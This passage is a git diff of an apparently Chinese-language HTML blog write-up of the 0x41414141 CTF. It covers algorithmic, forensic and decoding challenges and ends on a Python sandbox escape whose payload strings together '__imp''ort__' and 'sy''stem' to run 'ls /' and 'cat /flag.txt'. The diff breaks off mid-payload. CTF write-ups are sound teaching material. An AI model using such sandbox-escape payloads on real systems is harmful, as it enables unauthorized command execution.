@@ -573,7 +573,7 @@
 <p>然后发现文件最结尾隐写了。</p>
 <p>草死了。</p>
 <p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210126224653643.png" alt="secret"></p>
-<pre class="language-none"><code class="language-none">secret: 100100100101</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">secret: 100100100101<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>PIN 一般是4-6位，于是转十进制，即 <code>2341</code>.</p>
 <p>然后注册就好了。</p>
 <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Optimizer"><a href="#Optimizer" class="headerlink" title="Optimizer"></a>Optimizer</h3><blockquote>
@@ -585,7 +585,7 @@
 <p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210126221753360.png" alt="level 1"></p>
 <p>试了一下，他这个 list 的长度就是最初始的圆盘数量。</p>
 <p>找了个汉诺塔的递归实现。</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># n为圆盘数，a代表初始位圆柱，b代表过渡位圆柱，c代表目标位圆柱</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># n为圆盘数，a代表初始位圆柱，b代表过渡位圆柱，c代表目标位圆柱</span>
     <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
         <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">'--&gt;'</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>
     <span class="token keyword">else</span><span class="token punctuation">:</span>
@@ -593,11 +593,11 @@
         move<span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> c<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
         <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">'--&gt;'</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>
         <span class="token comment"># 将过渡位的n-1个圆盘移动到目标位，此时初始位为b，上一级函数的目标位c即为本级的目标位，上级的初始位a为本级的过渡位</span>
-        move<span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> b<span class="token punctuation">,</span> a<span class="token punctuation">,</span> c<span class="token punctuation">)</span></code></pre>
+        move<span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> b<span class="token punctuation">,</span> a<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>但是这里并不需要执行这个过程，只用关心移动的次数即可。</p>
 <p>可以发现递推公式是 $ f(n)=2*f(n-1)+1 $</p>
 <p>于是 payload</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">###### level 1 #######</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">###### level 1 #######</span>
 <span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> cnt<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
     <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
         cnt <span class="token operator">+=</span> <span class="token number">1</span>
@@ -627,7 +627,7 @@ cnt <span class="token operator">=</span> <span class="token number">0</span>
     sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'&gt; '</span><span class="token punctuation">)</span>
     sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>
     cnt <span class="token operator">+=</span> <span class="token number">1</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'~~~'</span><span class="token punctuation">,</span> cnt<span class="token punctuation">,</span> <span class="token string">'~~~'</span><span class="token punctuation">)</span>  <span class="token comment"># 25</span></code></pre>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'~~~'</span><span class="token punctuation">,</span> cnt<span class="token punctuation">,</span> <span class="token string">'~~~'</span><span class="token punctuation">)</span>  <span class="token comment"># 25</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>发现 25次交互之后就到了第二关。</p>
 <h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h4><p><strong>merge sort, give me the count of inversions</strong></p>
 <p>他的意思是，对给定的数组做归并排序，给出逆序数。</p>
@@ -644,7 +644,7 @@ cnt <span class="token operator">=</span> <span class="token number">0</span>
 <p>Divide 将n个元素分成两个包含n/2个元素的的子序列<br>Conquer 用并归排序对两个子序列进行排序<br>Merge 将两个已排序的子序列合并得到结果</p>
 </blockquote>
 <p>C++ 实现：</p>
-<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
+<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fstream&gt;</span></span>
 <span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>
 <span class="token keyword">const</span> <span class="token keyword">int</span> MAXN <span class="token operator">=</span> <span class="token number">1e7</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span>
@@ -720,9 +720,9 @@ cnt <span class="token operator">=</span> <span class="token number">0</span>
     count <span class="token operator">=</span> <span class="token function">MergeSort</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%u\n"</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>为了方便，移植到了 Python 上进行交互。</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">###### level 2 #######</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">###### level 2 #######</span>
 A <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">10000</span>
 T <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">10000</span>
 
@@ -776,7 +776,7 @@ cnt <span class="token operator">=</span> <span class="token number">0</span>
     cnt <span class="token operator">+=</span> <span class="token number">1</span>
     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'~~~'</span><span class="token punctuation">,</span> cnt<span class="token punctuation">,</span> <span class="token string">'~~~'</span><span class="token punctuation">)</span>  <span class="token comment"># 25</span>
 
-<span class="token comment"># b"you won here's your flag flag{g077a_0pt1m1ze_3m_@ll}\n"</span></code></pre>
+<span class="token comment"># b"you won here's your flag flag{g077a_0pt1m1ze_3m_@ll}\n"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>25次交互之后拿到 flag。</p>
 <p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210125004415945.png" alt="flag"></p>
 <p><code>flag{g077a_0pt1m1ze_3m_@ll}</code></p>
@@ -788,31 +788,31 @@ cnt <span class="token operator">=</span> <span class="token number">0</span>
 <p>发现删除了一个 <code>script.cpython-38.pyc</code>，下载下来看看吧。</p>
 <p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210125014140680.png" alt="commit"></p>
 <p>在线那个反编译不大成功，干脆直接本地反编译一下。</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">uncompyle6 -o scripy.py script.cpython-38.pyc</code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">uncompyle6 -o scripy.py script.cpython-38.pyc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>得到</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
 secret <span class="token operator">=</span> <span class="token string">'https://google.com'</span>
 cipher2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'NDE='</span><span class="token punctuation">,</span> <span class="token string">b'NTM='</span><span class="token punctuation">,</span> <span class="token string">b'NTM='</span><span class="token punctuation">,</span> <span class="token string">b'NDk='</span><span class="token punctuation">,</span> <span class="token string">b'NTA='</span><span class="token punctuation">,</span> <span class="token string">b'MTIz'</span><span class="token punctuation">,</span> <span class="token string">b'MTEw'</span><span class="token punctuation">,</span> <span class="token string">b'MTEw'</span><span class="token punctuation">,</span> <span class="token string">b'MzI='</span><span class="token punctuation">,</span> <span class="token string">b'NTE='</span><span class="token punctuation">,</span> <span class="token string">b'MzQ='</span><span class="token punctuation">,</span>
            <span class="token string">b'NDE='</span><span class="token punctuation">,</span> <span class="token string">b'NDA='</span><span class="token punctuation">,</span> <span class="token string">b'NTU='</span><span class="token punctuation">,</span> <span class="token string">b'MzY='</span><span class="token punctuation">,</span> <span class="token string">b'MTEx'</span><span class="token punctuation">,</span> <span class="token string">b'NDA='</span><span class="token punctuation">,</span> <span class="token string">b'NTA='</span><span class="token punctuation">,</span> <span class="token string">b'MTEw'</span><span class="token punctuation">,</span> <span class="token string">b'NDY='</span><span class="token punctuation">,</span> <span class="token string">b'MTI='</span><span class="token punctuation">,</span> <span class="token string">b'NDU='</span><span class="token punctuation">,</span> <span class="token string">b'MTE2'</span><span class="token punctuation">,</span> <span class="token string">b'MTIw'</span><span class="token punctuation">]</span>
-cipher1 <span class="token operator">=</span> <span class="token punctuation">[</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> secret<span class="token punctuation">]</span></code></pre>
+cipher1 <span class="token operator">=</span> <span class="token punctuation">[</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> secret<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>把 <code>cipher1</code> 打印出来，发现不对。</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token string">b'NDE='</span><span class="token punctuation">,</span> <span class="token string">b'NTM='</span><span class="token punctuation">,</span> <span class="token string">b'NTM='</span><span class="token punctuation">,</span> <span class="token string">b'NDk='</span><span class="token punctuation">,</span> <span class="token string">b'NTA='</span><span class="token punctuation">,</span> <span class="token string">b'MTIz'</span><span class="token punctuation">,</span> <span class="token string">b'MTEw'</span><span class="token punctuation">,</span> <span class="token string">b'MTEw'</span><span class="token punctuation">,</span> <span class="token string">b'Mzg='</span><span class="token punctuation">,</span> <span class="token string">b'NDY='</span><span class="token punctuation">,</span> <span class="token string">b'NDY='</span><span class="token punctuation">,</span> <span class="token string">b'Mzg='</span><span class="token punctuation">,</span> <span class="token string">b'NDU='</span><span class="token punctuation">,</span> <span class="token string">b'MzY='</span><span class="token punctuation">,</span> <span class="token string">b'MTEx'</span><span class="token punctuation">,</span> <span class="token string">b'MzQ='</span><span class="token punctuation">,</span> <span class="token string">b'NDY='</span><span class="token punctuation">,</span> <span class="token string">b'NDQ='</span><span class="token punctuation">]</span></code></pre>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token string">b'NDE='</span><span class="token punctuation">,</span> <span class="token string">b'NTM='</span><span class="token punctuation">,</span> <span class="token string">b'NTM='</span><span class="token punctuation">,</span> <span class="token string">b'NDk='</span><span class="token punctuation">,</span> <span class="token string">b'NTA='</span><span class="token punctuation">,</span> <span class="token string">b'MTIz'</span><span class="token punctuation">,</span> <span class="token string">b'MTEw'</span><span class="token punctuation">,</span> <span class="token string">b'MTEw'</span><span class="token punctuation">,</span> <span class="token string">b'Mzg='</span><span class="token punctuation">,</span> <span class="token string">b'NDY='</span><span class="token punctuation">,</span> <span class="token string">b'NDY='</span><span class="token punctuation">,</span> <span class="token string">b'Mzg='</span><span class="token punctuation">,</span> <span class="token string">b'NDU='</span><span class="token punctuation">,</span> <span class="token string">b'MzY='</span><span class="token punctuation">,</span> <span class="token string">b'MTEx'</span><span class="token punctuation">,</span> <span class="token string">b'MzQ='</span><span class="token punctuation">,</span> <span class="token string">b'NDY='</span><span class="token punctuation">,</span> <span class="token string">b'NDQ='</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>然后想到按照 <code>cipher1</code> 的逻辑逆向回去解 <code>cipher2</code></p>
-<pre class="language-python" data-language="python"><code class="language-python">l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> cipher2<span class="token punctuation">]</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> cipher2<span class="token punctuation">]</span>
 s <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>l<span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
-<span class="token comment"># https://archive.is/oMl59</span></code></pre>
+<span class="token comment"># https://archive.is/oMl59</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p>访问这个 archive 网站。</p>
 <p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210125013748865.png" alt="archive"></p>
 <p>发现了一个 PDF 文件</p>
-<pre class="language-none"><code class="language-none">super secret random file
-https://mega.nz/file/AAdDyIoB#gpj5s9N9-VnbNhSdkJ24Yyq3BWSYimoxanP-p03gQWs</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">super secret random file
+https://mega.nz/file/AAdDyIoB#gpj5s9N9-VnbNhSdkJ24Yyq3BWSYimoxanP-p03gQWs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210125013820898.png" alt="PDF"></p>
 <p><code>smashing.pdf</code></p>
 <p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210125015739155.png" alt="smashing.pdf"></p>
 <p>发现前几位和 65 异或一下，正好就是 <code>%PDF</code>，就是 PDF 的文件头，于是写个脚本处理一下。</p>
 <p><strong><em>（友情提醒，这里有坑，可以跳过这几段）</em></strong></p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./smashing.pdf'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./smashing.pdf'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>
     content <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
 
@@ -821,7 +821,7 @@ s <span class="token operator">=</span> <span class="token string">''</span>
     s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i <span class="token operator">^</span> <span class="token number">65</span><span class="token punctuation">)</span>
 
 <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./smashing_fix.pdf'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fout<span class="token punctuation">:</span>
-    fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+    fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>得到的文件，发现打开一片空白。</p>
 <p>再看 hex，在文件结尾发现了熟悉的压缩包。</p>
 <p>而且可以看到里面有个 <code>flag.txt</code></p>
@@ -832,7 +832,7 @@ s <span class="token operator">=</span> <span class="token string">''</span>
 <p>再回去看 python 脚本，在进行 <code>s.encode()</code> 之后长度变大了。看来编码这里面有问题。</p>
 <p><strong>得按照 byte 来逐位异或才行。</strong></p>
 <p>于是重写了一下脚本。</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./smashing.pdf'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./smashing.pdf'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>
     content <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
 
@@ -843,15 +843,15 @@ x <span class="token operator">=</span> <span class="token string">b''</span><sp
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
 <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./smashing_fix.pdf'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fout<span class="token punctuation">:</span>
-    fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>x<span class="token punctuation">)</span></code></pre>
+    fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>或者，用 <code>bytearray</code></p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># Or</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Or</span>
 parts <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">:</span>
     parts<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i <span class="token operator">^</span> <span class="token number">65</span><span class="token punctuation">)</span>
 
 <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./smashing_fix1.pdf'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fout<span class="token punctuation">:</span>
-    fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>parts<span class="token punctuation">)</span></code></pre>
+    fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>好坑啊！</p>
 <p>再打开来看，这就对了嘛！Bitcoin 讲究。</p>
 <p><img src="/2021/01/31/CTF_2021_0x41414141/image-20210126170726631.png" alt="pdf"></p>
@@ -868,7 +868,7 @@ parts <span class="token operator">=</span> <span class="token builtin">bytearra
 <p>US instance: 45.134.3.200 1024</p>
 </blockquote>
 <p>源码如下。</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
 
 <span class="token keyword">import</span> re
 <span class="token keyword">from</span> sys <span class="token keyword">import</span> modules<span class="token punctuation">,</span> version
@@ -895,7 +895,7 @@ modules<span class="token punctuation">.</span>clear<span class="token punctuati
             <span class="token keyword">exec</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'globals'</span><span class="token punctuation">:</span> <span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'print'</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
 
 <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
-    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>噫，是 <strong>Python 沙箱</strong> 啊！就和 SSTI 差不多啦。</p>
 <p>是绕绕绕好了，这题和平常的沙箱逃逸还有点不一样，就是他限制了执行的 <code>globals</code> 和 <code>locals</code>，还把 <code>sys.modules</code> 都删了。</p>
 <p>先在本地试着跑一下，把过滤的部分都注释掉。</p>
@@ -905,13 +905,13 @@ modules<span class="token punctuation">.</span>clear<span class="token punctuati
 <p>那我们就直接用这个好了！</p>
 <p>但是 <code>getattr</code>, <code>reload</code> 这类内置函数都么得了，如果在用到的模块内部需要 <code>__import__</code> 的话也用不来。</p>
 <p>试了一段时间，发现下面这个可行。</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>下面看看 如何绕过过滤。</p>
 <p>很明显字符串的话最简单直接就拼接好了，对于调用属性/方法的话，可以用 <code>xx.__dict__[函数名](参数)</code> 的方式来执行。</p>
 <p><em>（第二步过滤好像也没啥用的亚子</em></p>
 <p>于是 payload：</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'__imp'</span><span class="token string">'ort__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'sy'</span><span class="token string">'stem'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'__imp'</span><span class="token string">'ort__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'sy'</span><span class="token string">'stem'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat /flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'__imp'</span><span class="token string">'ort__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'sy'</span><span class="token string">'stem'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
